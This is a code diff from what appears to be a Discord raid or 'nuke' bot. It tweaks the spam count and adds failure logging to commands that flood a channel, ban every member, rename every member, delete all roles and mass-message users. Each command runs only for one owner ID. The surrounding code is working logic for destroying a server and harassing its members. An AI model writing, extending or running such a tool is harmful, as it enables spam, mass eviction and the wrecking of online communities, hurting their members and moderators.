@@ -89,11 +89,11 @@ async def alert(ctx, *, arg):
 @commands.guild_only()
 async def flood(ctx, *, arg):
     if ctx.author.id == ID:
-        i = 250
+        i = 100
         while i >= 0:
             await ctx.send(arg)
             i = int(i) - 1
-        print(color.GREEN + f"Flooded {ctx.channel.name}")
+        print(color.GREEN + f"[~] Flooded {ctx.channel.name}")
 
             
 @bot.command()
@@ -109,7 +109,7 @@ async def ban(ctx):
                 else:
                     await member.ban(reason=None)
             except:
-                print("\n")
+                print(color.RED + f"[!] Failed banning {member}")
         await msg.add_reaction("✅")
     else:
         return
@@ -125,7 +125,7 @@ async def nicknames(ctx, *, arg):
             try:
                 await member.edit(nick=arg)
             except:
-                print("\n")
+                print(color.RED + f"[!] Failed to change nickname of {member}")
         await msg.add_reaction("✅")
     else:
         return    
@@ -141,7 +141,7 @@ async def roles(ctx, *, arg):
             try:
                 await role.delete()
             except:
-                print("\n")
+                print(color.RED + f"[!] Failed to delete {role.name}")
         x = 30
         guild = ctx.guild
         while x >= 0:
@@ -159,7 +159,7 @@ async def dm(ctx, *, arg):
             try:
                 await member.send(arg)
             except:
-                print(f"[!] Failed to DM {member}")
+                print(color.RED + f"[!] Failed to DM {member}")
         await msg.add_reaction("✅")
         
 
